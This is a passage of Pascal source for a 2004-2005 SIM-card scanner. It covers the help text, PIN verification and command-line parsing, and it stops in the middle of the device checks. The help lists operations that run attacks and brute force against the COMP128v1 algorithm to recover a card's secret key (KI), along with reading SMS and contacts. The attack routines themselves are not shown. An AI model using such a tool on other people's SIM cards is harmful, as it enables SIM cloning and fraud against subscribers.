{WERT Sim-Card Scanner. 
 Copyright (C) 2004-2005 by Wert (AKA Joda).

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

 Project home root - ftp://ftp.ionb.ru/pub/sim/
 Author's e-mail   - wert@ionb.ru}

program WTS;
 {Главная программа WertScan}
 {Version 1.0.6}

uses
{$IFDEF LINUX}
 Libc,
{$ELSE}
 Windows,
{$ENDIF}
 SynaSer,SynaUtil,SysUtils, 
 Tables,WTypes,Functions,Emulator,ComPort,Attacks;

const
 VERSION:string='1.0.6';                {Версия софта}
 PORTNAME:string='/dev/ttyS0';          {Имя порта по умолчанию - для режима reader}
 PORTSPEED:longint=9600;                {Скорость порта по умолчанию - для режима reader} 
 IsPortNameOverwrite:boolean=false;
 IsPortSpeedOverwrite:boolean=false;
 
var
 Port:TBlockSerial;                     {Коммуникационный порт}
 Result:Longint;                       {Результат выполнения функций}
 RBuffer:TBuffer;                       {Буфер данных СИМ-ки для чтения}
 ReadC:Longint;                        {Байт считано/записано}
 Operation:byte;                        {Код выполняемой операции}
 CmdDuplicate:boolean;                  {Признак наличия нескольких команд в параметрах}
 PrOkDevice:boolean;                    {Признак правильно указанного параметра --device}
 SubOperation:byte;                     {Подоперация (для функций с параметром)}
 Pin:String[8];                         {PIN-код}
 Puk:String[8];                         {PUK-код}
 Rand:String[32];                       {RAND}
 Ki:String[32];                         {KI}
 AppendLog:boolean;                     {Признак дозаписи в файл gsm-log}
 ScanCycles:Longint;                   {Number of cycles}
 OutFile:String;                        {Output file name}
 CPair1,CPair2:TPair;                   {Первая и вторая найденные пары}
 CPair1Exist,CPair2Exist:Boolean;       {Признаки наличия CPair1 и CPair2}
 CData:TData8;                          {Четыре найденные пары}
 CDataExist:Boolean;                    {Признак наличия CData}
 CKI:TData16;                           {Семь найденных пар + 0000 вместо ненайденной}
 CKIExist:Boolean;                      {Признак наличия CKI}
 ReadExist:Boolean;                     {Признак наличия параметра --read}
 IgnoreCTS:Boolean;                     {Признак наличия параметра --ignorects}
 LogTime:Longint;                      {Время чтения лога телефона}
 TimeOut:Longint;                      {Время ожидания кода платформы при проведении BA}
 Applet:String;
 RandM:TData16;
 SRes:TData12;
 IPar,I,J,P:Longint;
 S:String;
 Pr:Boolean;
 Param,Value:String;                    {Имя параметра и его значение}
 OutFo:Text;
{$IFDEF LINUX}
 FDat:Text;
 RandomName,FixedName:string;
{$ENDIF}
 ResPair,ResPair2:TPair;
 ResKi:TData16;                         {Найденный KI}
 IMSI:String[18];
 StartTime,StopTime,AllTime:ULong;
 Hour,Min,Sec:Byte;

procedure WriteHelp;
 begin
  LWriteln('Using : wts [<operation> [<parameters>]]',2);
  LWriteln('  where:',2);
  LWriteln('-------------------------[R....]-------------------------------------[Default]-',2);
  LWriteln('[R....] <PR> --device=reader     : Using CardReader (Dejian, USI 2.0 etc.)',2);
  LWriteln('[R....]  <PR> --port=<name>      : Device port name [default /dev/ttyS0].',2);  
  LWriteln('[R....]  <PR> --speed=<number>   : Port speed - 9600, 19200, 38400 [def. 9600].',2);
  LWriteln('[R....]  <PR> --ignorects        : Dont use CTS for device checking.',2);
  LWriteln('-------------------------[.1...]-----------------------------------------------',2);
  LWriteln('[.1...] <PR> --device=emul1      : Using pseudo device - Comp128v1 emulator.',2);
  LWriteln('[.1...]  <PR> --ki=<num>         : KI number for emulator.',2);
  LWriteln('-------------------------[..M..]---------------------------[Not supported yet]-',2);
  LWriteln('[..M..] <PR> --device=r520m      : Using Ericsson R520m (data-cable).',2);
  LWriteln('[..M..]  <PR> --port=<name>      : Device port name [default /dev/ttyS0].',2);    
  LWriteln('[..M..]  <PR> --speed=<number>   : Port speed - 9600, 19200, 38400, 57600,',2);
  LWriteln('                                                115200 [default 19200].',2);
  LWriteln('[..M..]  <PR> --ignorects        : Dont use CTS for device checking.',2);
  LWriteln('-------------------------[...S.]-----------------------------[EXPERIMENTAL!!!]-',2);
  LWriteln('[...S.] <PR> --device=r520s      : Using Ericsson R520m (service-cable).',2);
  LWriteln('[...S.]  <PR> --port=<name>      : Device port name [default /dev/ttyS0].',2);    
  LWriteln('-------------------------[....D]---------------------------[Not supported yet]-',2);
  LWriteln('[....D] <PR> --device=r520d      : Using Ericsson R520m (LPT-port dongle).',2);
  LWriteln('[....D]  <PR> --port=<name>      : Device port name [default /dev/lp0].',2);
  LWriteln('===============================================================================',2);
  LWriteln('[R1MSD] <PR> --log=<name>        : Global-log file name.',2);
  LWriteln('[R1...] <PR> --gsmlog=<name>     : GSM-algo log file name.',2);
  LWriteln('[R1...]  <PR> --appendlog        : Append GSM-algo log file (not rewrite).',2);
  LWriteln('===============================================================================',2);
  LWriteln('[R1MSD] <OP> --version           : Write version information and exit.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1MSD] <OP> --help              : View this help screen.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --atr               : Reset SIM-card and read ATR.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --chv               : View CHV information.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --verify=<num>      : Verification CHV1 or CHV2.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 or PIN2 for verification.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --unblock=<num>     : Unblock CHV1 or CHV2.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : New PIN1 or PIN2 using after unblock.',2);
  LWriteln('[R....]  <PR> --puk=<number>     : PUK1 or PUK2 for unblock.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --imsi              : Read IMSI.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --gsm               : Run GSM-algo.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --rand=<num>       : RAND number.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --randscan          : Create random RAND-SRES file.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --scancycles=<num> : Number of cycles.',2);
  LWriteln('[R1...]  <PR> --outfile=<name>   : Output file name.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --a2rv1=<num>       : Run 2R(v1)-attack on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --a3rv1=<num>       : Run 3R(v1)-attack on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cpair1=<num>     : Already found comp. KI pair.',2);
  LWriteln('[R1...]  <PR> --stop1            : Stop 3R-attack after 1 tetraplet.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --a4rv1=<num>       : Run 4R(v1)-attack on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cpair1=<num>     : Already found comp-1. KI pair.',2);
  LWriteln('[R1...]  <PR> --cpair2=<num>     : Already found comp-2. KI pair.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --a5rv1=<num>       : Run 5R(v1)-attack on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cdata=<num>      : Already found KI data pairs.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --bfrv1=<num>       : Run brute force on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cki=<num>        : Already found KI data pairs (7).',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --bfr2pv1=<n1><n2>  : Run brute force on pairs <n1>, <n2>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cki=<num>        : Already found KI data pairs (6).',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --chkiv1            : Check KI (v1).',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --cki=<num>        : Found KI.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R1...] <OP> --findkiv1=<num>    : Find KI(v1). Starting on pair <num>.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('[R1...]  <PR> --stop1            : Stop 3R-attack after 1 tetraplet.',2);
  LWriteln('[R1...]  <PR> --retrace=<name>   : Read RAND-SRES from file.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --info              : Read SIM-filesystem info.',2);
  LWriteln('[R....]  <PR> --read             : Read files data (Only ALWS or CHV1 rights).',2);
  LWriteln('[R....]   <PR> --pin=<number>    : PIN1 for verification (for --read).',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --viewsms           : View SMS stored in SIM.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[R....] <OP> --viewadn           : View ADN/FDN stored in SIM.',2);
  LWriteln('[R....]  <PR> --pin=<number>     : PIN1 for verification.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[...S.] <OP> --initlog           : View phone init log.',2);
  LWriteln('[...S.]  <PR> --logtime=<number> : Logging time in seconds. Default - 60 sec.',2);
  LWriteln('----------------------------------',2);
  LWriteln('[...S.] <OP> --servicetest       : Phone service-mode test.',2);
  LWriteln('[...S.]  <PR> --timeout=<number> : Time for wait phone platform ID. [60 sec].',2);  
  LWriteln('[...S.]  <PR> --applet=<name>    : Applet file name. Default - Internal.',2);
 end;
 
function StdVerification(var Port:TBlockSerial;Pin:String[8]):Longint;
 var
  Res,Result:Longint;
 begin
  Res:=0;
  Result:=GetCHVStatus(Port);
  if Result<>-1 then begin
   if (Result and $100)=0 then begin
    Result:=Result and $0F;
    if Result=2 then begin
     Res:=-1;
     LWriteln('Cannot verify PIN1, because CHV is blocked.',2);
     LWriteln('',2);
    end
    else begin
     if (Result<>0) and (Pin='') then begin
      Res:=-1;
      LWriteln('Cannot verify PIN1, because no --pin parameter specified.',2);
      LWriteln('',2);
     end
     else begin
      if Result<>0 then begin
       Result:=VerifyCHV(Port,1,Pin);
      end;
      if Result<>0 then Res:=-1;
     end;
    end;
   end;    
  end 
  else Res:=-1;
  StdVerification:=Res;
 end;

begin
 Randomize;
 
 {Выведем приветствие}
 LWriteln('WERT Sim-Card Scanner. Version '+VERSION+'.',0);
 LWriteln('Copyright (C) 2004-2005 by Wert (AKA Joda).',0);
 LWriteln('',0);
 LWriteln('WertScan comes with ABSOLUTELY NO WARRANTY;',0);
 LWriteln('This is free software, and you are welcome to',0);
 LWriteln('redistribute it under certain conditions.',0);
 LWriteln('',0);

 {Прочитаем параметры командной строки}
 Operation:=0;
 SubOperation:=0;
 Pin:='';
 Puk:='';
 Rand:='';
 Ki:='';
 ScanCycles:=0;
 OutFile:='';
 Applet:='';
 LogFile:='';
 GsmFile:='';
 AppendLog:=false;
 LogTime:=60;
 TimeOut:=60;
 FillChar(CPair1[0],2,$0);
 FillChar(CPair2[0],2,$0);
 FillChar(CData[0],8,$0);
 FillChar(CKI[0],16,$0);
 CPair1Exist:=false;
 CPair2Exist:=false;
 Stop3R:=false;
 CDataExist:=false;
 CKIExist:=false;
 RetraceFile:='';
 RetraceStringCount:=0;
 ReadExist:=false;
 IgnoreCTS:=false;
 If ParamCount<>0 then begin
  for IPar:=1 to ParamCount do begin
   S:=ParamStr(IPar);
   P:=Pos('=',S);
   if (P<>0) then begin
    Param:=Copy(S,1,P-1);
    Value:=Copy(S,P+1,Length(S)-P);
   end
   else begin
    Param:=S;
    Value:='';
   end;
   {Параметры}
   {Важный параметр - device}
   if Param='--device' then begin
    PrOkDevice:=false;
    if Value='reader' then begin
     Device:=1;
     PrOkDevice:=true;
    end; 
    if Value='emul1' then begin
     Device:=2;
     PrOkDevice:=true;
    end; 
    if Value='r520m' then begin
     Device:=3;
     PrOkDevice:=true;
    end; 
    if Value='r520s' then begin
     Device:=4;
     PrOkDevice:=true;
    end; 
    if Value='r520d' then begin
     Device:=5;
     PrOkDevice:=true;
    end;
    if (PrOkDevice=false) then begin
     LWriteln('ERROR! Invalid --device parameter.',0);
     LWriteln('       Using --device=reader|emul1|r520m|r520s|r520d.',0);
     LWriteln('',0);
     Halt(1);
    end; 
   end;
   {Параметр порта}
   if Param='--port' then begin
    if (Length(Value)>0) and ((Copy(Value,1,9)='/dev/ttyS') or (Copy(Value,1,7)='/dev/lp')) then begin
     PORTNAME:=Value;
     IsPortNameOverwrite:=true;
    end
    else begin
     LWriteln('ERROR! Invalid --port parameter. Using --port=/dev/ttySx|/dev/lpx.',0);
     LWriteln('',0);
     Halt(1);
    end;
   end;
   {Параметр скорости}
   if Param='--speed' then begin
    if (Length(Value)>0) and ((Value='9600') or (Value='19200') or (Value='38400') or 
     (Value='57600') or (Value='115200')) then begin
     PORTSPEED:=StrToInt(Value);
     IsPortSpeedOverwrite:=true;
    end
    else begin
     LWriteln('ERROR! Invalid --speed parameter.',0);
     LWriteln('       Using --speed=9600|19200|38400|57600|115200.',0);
     LWriteln('',0);
     Halt(1);
    end;
   end;
   {Параметр PIN-кода}
   if Param='--pin' then begin
    Pr:=True;
    if (Length(Value)<4) or (Length(Value)>8) then Pr:=False
    else begin
     for I:=1 to Length(Value) do begin
      if (Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9') then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --pin parameter. PIN must have 4-8 digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else Pin:=Value;
   end;
   {Параметр PUK-кода}
   if Param='--puk' then begin
    Pr:=True;
    if (Length(Value)<>8) then Pr:=False
    else begin
     for I:=1 to 8 do begin
      if (Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9') then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --puk parameter. PUK must have 8 digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else Puk:=Value;
   end;
   {Параметр RAND-а - для команды gsm}
   if Param='--rand' then begin
    Pr:=True;
    if (Length(Value)<>32) then Pr:=False
    else begin
     for I:=1 to 32 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 32 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --rand parameter. Rand must have 32 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else Rand:=Value;
   end;
   {Параметр KI - для emul1}
   if Param='--ki' then begin
    Pr:=True;
    if (Length(Value)<>32) then Pr:=False
    else begin
     for I:=1 to 32 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 32 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --ki parameter. KI must have 32 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else begin 
     Ki:=Value;
     for I:=0 to 15 do begin
      KiM[I]:=ChrToHex(Copy(Ki,2*I+1,2));
     end;
    end; 
   end;
   {Параметр ScanCycles - для команды gsm}
   if Param='--scancycles' then begin
    Pr:=True;
    if (Length(Value)=0) then Pr:=False
    else begin
     for I:=1 to Length(Value) do begin
      if (Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9') then Pr:=False;
     end;
    end;
    if Pr=True then begin
     ScanCycles:=StrToInt(Value);
     if (ScanCycles<=0) or (ScanCycles>=$7FFFFFFF) then Pr:=False;
    end; 
    if Pr=False then begin
     LWriteln('ERROR! Invalid --scancycles parameter. Scancycles must be natural number.',0);
     LWriteln('',0);
     Halt(1);
    end;
   end;
   {Параметр OutFile - для команды gsm}
   if Param='--outfile' then begin
    Pr:=True;
    if (Length(Value)=0) or (Length(Value)>32) then Pr:=False;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --outfile parameter. Outfile is a string not longer 32 symbols.',0);
     LWriteln('',0);
     Halt(1);
    end
    else OutFile:=Value;
   end;
   {Параметр Retrace - имя файла лога для операции retrace}
   if Param='--retrace' then begin
    Pr:=True;
    if (Length(Value)=0) or (Length(Value)>32) then Pr:=False;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --retrace parameter. Retrace is a string not longer 32 symbols.',0);
     LWriteln('',0);
     Halt(1);
    end
    else RetraceFile:=Value;
   end;
   {Параметр глобального log-файла}
   if Param='--log' then begin
    Pr:=True;
    if (Length(Value)=0) or (Length(Value)>32) then Pr:=False;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --log parameter. Log is a string not longer 32 symbols.',0);
     LWriteln('',0);
     Halt(1);
    end
    else LogFile:=Value;
   end;
   {Параметр лога gsm-операций}
   if Param='--gsmlog' then begin
    Pr:=True;
    if (Length(Value)=0) or (Length(Value)>32) then Pr:=False;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --gsmlog parameter. Gsmlog is a string not longer 32 symbols.',0);
     LWriteln('',0);
     Halt(1);
    end
    else GsmFile:=Value;
   end;
   {Добавлять gsm-log файл в конец, а не перезаписывать}
   if Param='--appendlog' then begin
    AppendLog:=true;
   end;
   {Параметр Applet - для команды servicetest}
   if Param='--applet' then begin
    Pr:=True;
    if (Length(Value)=0) or (Length(Value)>32) then Pr:=False;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --applet parameter. Applet is a string not longer 32 symbols.',0);
     LWriteln('',0);
     Halt(1);
    end
    else Applet:=Value;
   end;
   {Первая найденная пара из KI}
   if Param='--cpair1' then begin
    Pr:=True;
    if (Length(Value)<>4) then Pr:=False
    else begin
     for I:=1 to 4 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 4 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --cpair1 parameter. CPair1 must have 4 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else begin
     CPair1[0]:=ChrToHex(Copy(Value,1,2));
     CPair1[1]:=ChrToHex(Copy(Value,3,2));
     CPair1Exist:=true;
    end; 
   end;
   {Вторая найденная пара из KI}
   if Param='--cpair2' then begin
    Pr:=True;
    if (Length(Value)<>4) then Pr:=False
    else begin
     for I:=1 to 4 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 4 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --cpair2 parameter. CPair2 must have 4 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else begin
     CPair2[0]:=ChrToHex(Copy(Value,1,2));
     CPair2[1]:=ChrToHex(Copy(Value,3,2));
     CPair2Exist:=true;
    end; 
   end;
   {4 найденные пары из KI}
   if Param='--cdata' then begin
    Pr:=True;
    if (Length(Value)<>16) then Pr:=False
    else begin
     for I:=1 to 16 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 16 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --cdata parameter. CData must have 16 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else begin
     for I:=1 to 16 do CData[I-1]:=ChrToHex(Copy(Value,(I-1)*2+1,2));
     CDataExist:=true;
    end; 
   end;
   {Найденные 6/7 пар из KI или весь KI}
   if Param='--cki' then begin
    Pr:=True;
    if (Length(Value)<>32) then Pr:=False
    else begin
     for I:=1 to 32 do Value[I]:=UpCase(Value[I]);
     for I:=1 to 32 do begin
      if ((Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9')) and 
       ((Copy(Value,I,1)<'A') or (Copy(Value,I,1)>'F')) then Pr:=False;
     end;
    end;
    if Pr=False then begin
     LWriteln('ERROR! Invalid --cki parameter. CKI must have 32 hex-digits.',0);
     LWriteln('',0);
     Halt(1);
    end
    else begin
     for I:=1 to 32 do CKI[I-1]:=ChrToHex(Copy(Value,(I-1)*2+1,2));
     CKIExist:=true;
    end; 
   end;
   {Параметр read - признак чтения содержимого файлов СИМ-ки}
   if Param='--read' then begin
    ReadExist:=true;
   end;
   {Не проверять наличие устройства на com-порту}
   if Param='--ignorects' then begin
    IgnoreCTS:=true;
   end;
   {Останавливать 3R-атаку сразу}
   if Param='--stop1' then begin
    Stop3R:=true;
   end;
   {Параметр LogTime - для команды initlog}
   if Param='--logtime' then begin
    Pr:=True;
    if (Length(Value)=0) then Pr:=False
    else begin
     for I:=1 to Length(Value) do begin
      if (Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9') then Pr:=False;
     end;
    end;
    if Pr=True then begin
     LogTime:=StrToInt(Value);
     if (LogTime<0) or (LogTime>=$7FFFFFFF) then Pr:=False;
    end; 
    if Pr=False then begin
     LWriteln('ERROR! Invalid --logtime parameter. Logtime must be natural number.',0);
     LWriteln('',0);
     Halt(1);
    end;
   end;
   {Параметр TimeOut - для команды servicetest}
   if Param='--timeout' then begin
    Pr:=True;
    if (Length(Value)=0) then Pr:=False
    else begin
     for I:=1 to Length(Value) do begin
      if (Copy(Value,I,1)<'0') or (Copy(Value,I,1)>'9') then Pr:=False;
     end;
    end;
    if Pr=True then begin
     TimeOut:=StrToInt(Value);
     if (TimeOut<0) or (TimeOut>=$7FFFFFFF) then Pr:=False;
    end; 
    if Pr=False then begin
     LWriteln('ERROR! Invalid --timeout parameter. Timeout must be natural number.',0);
     LWriteln('',0);
     Halt(1);
    end;
   end;

   {Команды}
   CmdDuplicate:=false;
   {Просто вывести версию}
   if Param='--version' then begin
    if Operation=0 then Operation:=1 else CmdDuplicate:=true;
   end;
   {Просто вывести помощь}
   if Param='--help' then begin
    if Operation=0 then Operation:=2 else CmdDuplicate:=true;
   end;
   {Считать atr}
   if Param='--atr' then begin
    if Operation=0 then Operation:=3 else CmdDuplicate:=true;
   end;
   {Считать chv}
   if Param='--chv' then begin
    if Operation=0 then Operation:=4 else CmdDuplicate:=true;
   end;
   {Проверить chv}
   if Param='--verify' then begin
    if (Value<>'1') and (Value<>'2') then begin
     LWriteln('ERROR! Invalid --verify argument. Using --verify=1|2.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=5 else CmdDuplicate:=true;
    end; 
   end;
   {Разблокировать chv}
   if Param='--unblock' then begin
    if (Value<>'1') and (Value<>'2') then begin
     LWriteln('ERROR! Invalid --unblock argument. Using --unblock=1|2.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=6 else CmdDuplicate:=true;
    end; 
   end;
   {Считать IMSI}
   if Param='--imsi' then begin
    if Operation=0 then Operation:=7 else CmdDuplicate:=true;
   end;
   {Выполнить один gsm-шаг}
   if Param='--gsm' then begin
    if Operation=0 then Operation:=8 else CmdDuplicate:=true;
   end;
   {Построить список RAND-SRES}
   if Param='--randscan' then begin
    if Operation=0 then Operation:=9 else CmdDuplicate:=true;
   end;
   {Провести 2R-атаку}
   if Param='--a2rv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'7') then begin
     LWriteln('ERROR! Invalid --a2rv1 argument. Using --a2rv1=0|1|2|3|4|5|6|7.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=10 else CmdDuplicate:=true;
    end; 
   end;
   {Провести 3R-атаку}
   if Param='--a3rv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'7') then begin
     LWriteln('ERROR! Invalid --a3rv1 argument. Using --a3rv1=0|1|2|3|4|5|6|7.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=11 else CmdDuplicate:=true;
    end; 
   end;
   {Провести 4R-атаку}
   if Param='--a4rv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'7') then begin
     LWriteln('ERROR! Invalid --a4rv1 argument. Using --a4rv1=0|1|2|3|4|5|6|7.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=12 else CmdDuplicate:=true;
    end; 
   end;
   {Провести 5R-атаку}
   if Param='--a5rv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'1') then begin
     LWriteln('ERROR! Invalid --a5rv1 argument. Using --a5rv1=0|1.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=13 else CmdDuplicate:=true;
    end; 
   end;
   {Провести поиск последней пары}
   if Param='--bfrv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'7') then begin
     LWriteln('ERROR! Invalid --bfrv1 argument. Using --bfrv1=0|1|2|3|4|5|6|7.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=14 else CmdDuplicate:=true;
    end; 
   end;
   {Провести поиск двух последних пар}
   if Param='--bfr2pv1' then begin
    if (Length(Value)<>2) or (Value[1]<'0') or (Value[1]>'7') or (Value[2]<'0') or (Value[2]>'7') then begin
     LWriteln('ERROR! Invalid --bfr2pv1 argument. Using --bfr2pv1=(0|1|2|3|4|5|6|7)(0|1|2|3|4|5|6|7).',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=15 else CmdDuplicate:=true;
    end; 
   end;
   {Проверить KI}
   if Param='--chkiv1' then begin
    if Operation=0 then Operation:=16 else CmdDuplicate:=true;
   end;
   {Найти KI}
   if Param='--findkiv1' then begin
    if (Length(Value)<>1) or (Value<'0') or (Value>'7') then begin
     LWriteln('ERROR! Invalid --findkiv1 argument. Using --findkiv1=0|1|2|3|4|5|6|7.',0);
     LWriteln('',0);
     Halt(1);     
    end
    else begin
     SubOperation:=StrToInt(Value);
     if Operation=0 then Operation:=17 else CmdDuplicate:=true;
    end; 
   end;
   {Считать файловую структуру СИМки}
   if Param='--info' then begin
    if Operation=0 then Operation:=18 else CmdDuplicate:=true;
   end;
   {Считать и показать СМС}
   if Param='--viewsms' then begin
    if Operation=0 then Operation:=19 else CmdDuplicate:=true;
   end;
   {Считать и показать ADN/FDN}
   if Param='--viewadn' then begin
    if Operation=0 then Operation:=20 else CmdDuplicate:=true;
   end;
   {Считать инициализационный лог телефона (через сервис-кабель)}
   if Param='--initlog' then begin
    if Operation=0 then Operation:=21 else CmdDuplicate:=true;
   end;
   {Провести тестирование service-mode}
   if Param='--servicetest' then begin
    if Operation=0 then Operation:=22 else CmdDuplicate:=true;
   end;

  end;
 end;

 {Проверка на несколько команд}
 if CmdDuplicate=true then begin
  LWriteln('ERROR! Duplicate operation-word detected.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 {Если операции не указано}
 if Operation=0 then Operation:=2;
 {Изменение значений по умолчанию}
 if (Device=5) and (IsPortNameOverwrite=false) then PORTNAME:='dev/lp0';
 if (Device=3) and (IsPortSpeedOverwrite=false) then PORTSPEED:=19200;
 {Проверки, связанные с конкретными device}
 case Device of
  1:begin
   {reader}
   if not (Operation in [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]) then begin
    LWriteln('ERROR! Operation not compatible with current device.',0);
    LWriteln('',0);
    Halt(1);     
   end;
   if Copy(PORTNAME,1,9)<>'/dev/ttyS' then begin
    LWriteln('ERROR! Invalid --port parameter. Using --port=/dev/ttySx.',0);
    LWriteln('',0);
    Halt(1);
   end;
   if (PORTSPEED<>9600) and (PORTSPEED<>19200) and (PORTSPEED<>38400) then begin
    LWriteln('ERROR! Invalid --speed parameter.',0);
    LWriteln('       Using --speed=9600|19200|38400.',0);
    LWriteln('',0);
    Halt(1);
   end;
  end;
  2:begin
   {emul1}
